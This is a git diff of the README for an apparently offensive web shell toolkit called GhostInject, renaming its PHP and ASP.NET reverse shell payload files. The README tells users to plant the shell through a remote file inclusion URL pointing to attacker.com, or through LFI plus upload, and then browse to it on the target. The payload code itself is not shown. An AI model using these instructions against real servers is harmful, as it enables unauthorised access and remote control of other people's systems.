@@ -21,20 +21,20 @@
 
 | Platform | File | Language | Reverse Shell Methods |
 |----------|------|----------|----------------------|
-| Linux (Apache/Nginx) | `ghostinject_linux.php` | PHP | Bash `/dev/tcp` → PHP socket |
-| Windows (XAMPP/Wamp/IIS+PHP) | `ghostinject_win.php` | PHP | PHP socket → PowerShell |
-| Windows IIS (.NET) | `ghostinject.aspx` | ASP.NET C# | C# `TcpClient` thread |
+| Linux (Apache/Nginx) | `ghostinject_linux_terminal.php` | PHP | Bash `/dev/tcp` → PHP socket |
+| Windows (XAMPP/Wamp/IIS+PHP) | `ghostinject_win_terminal.php` | PHP | PHP socket → PowerShell |
+| Windows IIS (.NET) | `ghostinject_win_terminal.aspx` | ASP.NET C# | C# `TcpClient` thread |
 
 ## Quick Start
 
 ### 1. Upload / Include the payload
 
-- Exploit an RFI vulnerability: `?page=http://attacker.com/ghostinject_linux.php`
+- Exploit an RFI vulnerability: `?page=http://attacker.com/ghostinject_linux_terminal.php`
 - Or upload the file via LFI + file upload, then browse to it.
 
 ### 2. Access the web interface
 
-- Open `http://target.com/ghostinject_xxx.php` or `http://target.com/ghostinject.aspx`.
+- Open `http://target.com/ghostinject_xxx.php` or `http://target.com/ghostinject_win_terminal.aspx`.
 
 ### 3. Use the terminal
 
